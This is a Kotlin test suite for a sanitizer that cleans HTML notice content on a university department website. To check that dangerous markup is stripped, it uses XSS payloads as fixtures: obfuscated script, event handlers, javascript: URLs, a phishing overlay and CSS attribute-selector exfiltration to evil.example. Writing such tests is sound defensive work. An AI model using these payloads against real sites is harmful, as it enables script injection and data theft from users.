package com.wafflestudio.csereal.common.sanitize

import com.wafflestudio.csereal.common.properties.EndpointProperties
import io.kotest.core.spec.style.BehaviorSpec
import io.kotest.matchers.shouldBe
import io.kotest.matchers.shouldNotBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.string.shouldNotContain
import java.nio.file.Files
import kotlin.io.path.absolutePathString

/**
 * 세탁 계약을 지킨다.
 *
 * 페이로드는 대부분 **운영 DB 에 실제로 들어 있던 것**이다 — 지어낸 예제가 아니라
 * 이 작업을 하게 만든 데이터다.
 */
class ContentSanitizerTest : BehaviorSpec({
    val uploadDir = Files.createTempDirectory("sanitize-test")
    val sanitizer = ContentSanitizer(
        InlineImageExtractor(
            uploadPath = uploadDir.absolutePathString() + "/",
            endpointProperties = EndpointProperties(
                frontend = "https://cse.snu.ac.kr",
                backend = "https://cse.snu.ac.kr/api"
            )
        )
    )

    val overlay = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;background:#fff"
    val tableRow = """<td valign="top" colspan="2" style="width:120px;background-color:#eee">칸</td>"""
    val imageAttrs = """data-proportion="true" data-align="center" data-size="400px," style="width:400px""""
    val typography = "font-size:15px;color:#333;line-height:1.6;text-align:center;word-break:keep-all"

    Given("실행 가능한 것") {
        When("난독화된 script (공지 12573 에 실제로 저장돼 있던 것)") {
            val html = """<p>안내</p><script>var x=new window["\x52\x65\x67\x45\x78\x70"]("(Google)","gi")</script>"""
            Then("사라진다") {
                val out = sanitizer.sanitize(html)
                out shouldContain "안내"
                out shouldNotContain "script"
                out shouldNotContain "RegExp"
            }
        }

        When("따옴표 없는 이벤트 핸들러") {
            Then("속성이 사라진다") {
                sanitizer.sanitize("""<p onmouseover=alert(1)>본문</p>""") shouldNotContain "onmouseover"
            }
        }

        When("엔티티로 난독화한 javascript: URL") {
            Then("href 가 사라지고 글자만 남는다") {
                val out = sanitizer.sanitize("""<a href="javas&#99;ript:alert(1)">링크</a>""")
                out shouldContain "링크"
                out shouldNotContain "alert"
            }
        }

        When("문법검사 확장이 심은 iframe (코퍼스에 71건)") {
            Then("본문만 남는다") {
                val out = sanitizer.sanitize(
                    """<p>본문</p><iframe class="ginger-extension-definitionpopup" style="display:none"></iframe>"""
                )
                out shouldContain "본문"
                out shouldNotContain "iframe"
            }
        }
    }

    Given("상자를 벗어나려는 CSS") {
        When("전면 오버레이") {
            Then("탈출 속성만 빠지고 나머지는 남는다") {
                val out = sanitizer.sanitize(
                    """<div style="$overlay">피싱</div>"""
                )
                out shouldNotContain "position"
                out shouldNotContain "z-index"
                out shouldContain "background"
                out shouldContain "피싱"
            }
        }

        When("규칙 밖으로 탈출을 시도하는 선언") {
            Then("중괄호가 출력에 남지 않는다") {
                val out = sanitizer.sanitize("""<p style="color:red} body{display:none} .x{color:blue">x</p>""")
                out shouldNotContain "}"
                out shouldNotContain "body"
            }
        }

        When("외부 이미지를 부르는 background") {
            Then("url() 이 사라진다") {
                sanitizer.sanitize(
                    """<p style="background-image:url(https://evil.example/track.png)">x</p>"""
                ) shouldNotContain "evil.example"
            }
        }
    }

    Given("CSS 로 외부 요청을 만드는 시도") {
        // 인라인 style 의 url() 은 OWASP 가 거부한다 — allowStyling() 만 켜고
        // allowUrlsInStyles() 는 켜지 않았다. 누가 그걸 켜면 여기서 깨진다.
        When("background 에 외부 URL") {
            Then("선언이 사라진다") {
                val out = sanitizer.sanitize(
                    """<p style="color:red;background:url(https://evil.example/px.png)">x</p>"""
                )
                out shouldNotContain "evil.example"
                out shouldContain "color:red"
            }
        }

        When("list-style-image 에 외부 URL") {
            Then("선언이 사라진다") {
                sanitizer.sanitize(
                    """<ul><li style="list-style-image:url('https://evil.example/b.png')">x</li></ul>"""
                ) shouldNotContain "evil.example"
            }
        }

        When("url() 안에 javascript: 나 data:") {
            Then("둘 다 사라진다") {
                val js = sanitizer.sanitize("""<p style="background:url(javascript:alert(1))">x</p>""")
                val data = sanitizer.sanitize("""<p style="background:url(data:image/png;base64,AAAA)">x</p>""")
                js shouldNotContain "javascript"
                data shouldNotContain "data:"
            }
        }

        When("<style> 요소로 속성 셀렉터 유출") {
            // 인라인 style 에는 셀렉터를 쓸 수 없으니 이 경로는 <style> 요소뿐이다.
            Then("요소째 사라진다") {
                val out = sanitizer.sanitize(
                    """<p>본문</p><style>input[value^="a"]{background:url(https://evil.example/a)}</style>"""
                )
                out shouldContain "본문"
                out shouldNotContain "<style"
                out shouldNotContain "evil.example"
            }
        }

        When("<img src> 가 외부 도메인") {
            // 세탁기는 http/https 이미지를 막지 않는다. 이건 브라우저 CSP img-src 가 맡는다.
            // 여기서는 그 사실이 바뀌지 않았음을 확인한다 — 바뀌면 문서(css-allowlist)도 고쳐야 한다.
            Then("세탁기는 통과시킨다") {
                sanitizer.sanitize("""<img src="https://evil.example/pixel.png">""") shouldContain "evil.example"
            }
        }
    }

    Given("정상 서식") {
        When("표") {
            Then("구조와 셀 속성이 남는다") {
                val out = sanitizer.sanitize(
                    """<table cellpadding="3" border="1"><tr>$tableRow</tr></table>"""
                )
                out shouldContain "<table"
                out shouldContain "colspan=\"2\""
                out shouldContain "valign=\"top\""
                out shouldContain "background-color"
            }
        }

        When("suneditor 이미지") {
            Then("재편집에 필요한 data-* 가 남는다") {
                val out = sanitizer.sanitize(
                    """<figure><img src="/file/1" alt="x" $imageAttrs></figure>"""
                )
                out shouldContain "data-proportion"
                out shouldContain "data-align"
                out shouldContain "width:400px"
            }
        }

        When("본문 서식") {
            Then("타이포·정렬이 남는다") {
                val out = sanitizer.sanitize(
                    """<p style="$typography">공지</p>"""
                )
                out shouldContain "font-size:15px"
                out shouldContain "text-align:center"
                out shouldContain "word-break:keep-all"
            }
        }
    }

    Given("폰트 이름") {
        When("font-family 가 있는 본문") {
            Then("선언만 빠지고 나머지는 남는다") {
                val out = sanitizer.sanitize(
                    """<p style="line-height:160%;font-family:'바탕';color:black;font-size:10pt">본문</p>"""
                )
                out shouldNotContain "font-family"
                out shouldContain "line-height"
                out shouldContain "font-size:10pt"
                out shouldContain "본문"
            }
        }
    }

    Given("전처리") {
        When("display:none 인 요소") {
            Then("요소째 사라져 안의 글자가 검색에도 안 남는다") {
                val out = sanitizer.sanitize(
                    """<p>보이는 글</p><div style="display: none;">숨은 글</div>"""
                )
                out shouldContain "보이는 글"
                out shouldNotContain "숨은 글"
            }
        }

        When("src 없는 img (코퍼스에 8건)") {
            Then("사라진다") {
                sanitizer.sanitize("""<p>가<img alt="·" width="189" height="94">나</p>""") shouldNotContain "<img"
            }
        }

        When("base64 로 붙여넣은 PNG") {
            val png = "data:image/png;base64," + java.util.Base64.getEncoder().encodeToString(
                byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 1, 2, 3)
            )
            val out = sanitizer.sanitize("""<p><img src="$png" alt="붙여넣은 이미지"></p>""")

            Then("파일로 빠지고 src 가 URL 이 된다") {
                out shouldNotContain "base64"
                out shouldContain "/v1/file/"
                out shouldContain "alt=\"붙여넣은 이미지\""
            }
            Then("디스크에 실제로 쓰인다") {
                Files.list(uploadDir).use { it.anyMatch { p -> p.fileName.toString().endsWith(".png") } } shouldBe true
            }
        }

        When("PNG 로 선언됐지만 실제로는 JPEG (덤프 209개 중 4개가 그렇다)") {
            val jpeg = "data:image/png;base64," + java.util.Base64.getEncoder().encodeToString(
                byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(), 0, 0x10)
            )
            Then("매직 넘버를 따라 .jpg 로 저장된다") {
                sanitizer.sanitize("""<img src="$jpeg">""")
                Files.list(uploadDir).use { it.anyMatch { p -> p.fileName.toString().endsWith(".jpg") } } shouldBe true
            }
        }

        When("이미지가 아닌 data: URL") {
            Then("요소째 사라진다 — src 없는 빈 이미지를 남기지 않는다") {
                val html = """<p>본문</p><img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">"""
                val out = sanitizer.sanitize(html)
                out shouldContain "본문"
                out shouldNotContain "data:"
                out shouldNotContain "<img"
            }
        }

        When("디코드할 수 없는 base64") {
            Then("요소째 사라진다") {
                sanitizer.sanitize("""<p>가</p><img src="data:image/png;base64,%%%">""") shouldNotContain "<img"
            }
        }
    }

    Given("후처리") {
        When("평문 URL 이 있는 본문") {
            Then("링크가 된다") {
                val out = sanitizer.sanitize("<p>자세한 내용은 https://cse.snu.ac.kr/notice 참고</p>")
                out shouldContain """href="https://cse.snu.ac.kr/notice""""
                out shouldContain "rel=\"noopener noreferrer\""
            }
        }

        When("메일 주소") {
            Then("mailto 링크가 된다") {
                sanitizer.sanitize("<p>문의: office@cse.snu.ac.kr</p>") shouldContain "mailto:office@cse.snu.ac.kr"
            }
        }

        When("코드 블록 안의 명령줄") {
            Then("건드리지 않는다") {
                sanitizer.sanitize("<pre>curl https://api.example.com/v1</pre>") shouldNotContain "<a"
            }
        }

        When("파일 이름이 도메인처럼 생겼을 때") {
            Then("링크로 만들지 않는다") {
                val out = sanitizer.sanitize("<p>첨부: 2026학년도_모집요강.pdf 와 지원서.hwp 를 확인하세요</p>")
                out shouldNotContain "<a"
                out shouldContain "모집요강.pdf"
            }
        }

        When("이미 링크인 것") {
            Then("이중으로 감싸지 않는다") {
                val out = sanitizer.sanitize("""<a href="https://cse.snu.ac.kr">https://cse.snu.ac.kr</a>""")
                out.split("<a ").size shouldBe 2
            }
        }

        When("문장 끝의 URL") {
            Then("마침표를 링크에 넣지 않는다") {
                sanitizer.sanitize("<p>https://cse.snu.ac.kr/notice.</p>") shouldContain
                    """href="https://cse.snu.ac.kr/notice""""
            }
        }

        When("텍스트에 꺾쇠가 섞여 있을 때") {
            Then("태그로 해석되지 않는다") {
                val out = sanitizer.sanitize("<p>a &lt; b 는 https://cse.snu.ac.kr 참고</p>")
                out shouldContain "&lt;"
                out shouldContain "<a "
            }
        }
    }

    Given("멱등성") {
        // 이게 깨지면 글이 저장될 때마다 조금씩 깎이고, backfill 을 다시 돌릴 수 없다.
        // font-family 를 허용 목록에 남겼을 때 운영 코퍼스 400건 중 42건이 위반이었다.
        val cases = listOf(
            """<p style="font-size:14px;font-family:돋움체">주최사 / 활동명</p>""",
            """<span style="font-family:'맑은 고딕'">글자</span>""",
            """<p style="margin:0cm 0cm 0pt;mso-pagination:widow-orphan"><span style="font-family:바탕">본문</span></p>""",
            """<table><tr><td style="width:120px;background:white">칸</td></tr></table>""",
            "<p>문의 office@cse.snu.ac.kr 또는 https://cse.snu.ac.kr</p>",
            """<div style="display:none">숨김</div><p>본문</p>""",
            "<p>a &lt; b &amp; c</p>",
            """<p style="color:red} body{display:none} .x{color:blue">x</p>"""
        )

        cases.forEachIndexed { i, html ->
            When("케이스 $i 를 두 번 세탁") {
                Then("결과가 같다") {
                    val once = sanitizer.sanitize(html)
                    sanitizer.sanitize(once) shouldBe once
                }
            }
        }
    }

    Given("빈 입력") {
        When("빈 문자열") {
            Then("그대로 둔다") {
                sanitizer.sanitize("") shouldBe ""
            }
        }
        When("평문") {
            Then("살아남는다") {
                sanitizer.sanitize("안녕하세요") shouldContain "안녕하세요"
            }
        }
    }

    Given("본문 전체") {
        When("정상 공지를 세탁") {
            Then("글자가 사라지지 않는다") {
                val html = """
                    <p class="0">안녕하세요</p>
                    <p class="0">컴퓨터 공학부 행정실입니다.</p>
                    <p class="0">가. 선발인원: 총 8명</p>
                """.trimIndent()
                val out = sanitizer.sanitize(html)
                out shouldContain "컴퓨터 공학부 행정실입니다."
                out shouldContain "선발인원"
                out shouldNotBe ""
            }
        }
    }
})
